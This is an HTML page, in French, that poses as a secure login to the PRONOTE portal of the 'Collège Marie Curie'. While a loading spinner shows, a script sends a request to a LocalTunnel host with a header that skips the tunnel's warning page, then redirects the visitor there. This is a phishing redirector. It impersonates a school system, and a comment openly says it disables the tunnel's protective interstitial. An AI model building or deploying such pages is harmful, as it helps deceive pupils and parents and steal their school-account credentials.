<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion au PRONOTE du Collège Marie Curie</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f4f4f9; color: #333; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Connexion sécurisée au PRONOTE...</h2>
    <div class="loader"></div>
    <p>Veuillez patienter quelques secondes.</p>

    <script>
        const tunnelUrl = "https://loca.lt";

        // Déblocage automatique de la page anti-bot de LocalTunnel
        fetch(tunnelUrl, {
            mode: "no-cors",
            headers: {
                "bypass-tunnel-reminder": "true"
            }
        }).then(() => {
            window.location.href = tunnelUrl;
        }).catch(() => {
            window.location.href = tunnelUrl;
        });
    </script>
</body>
</html>
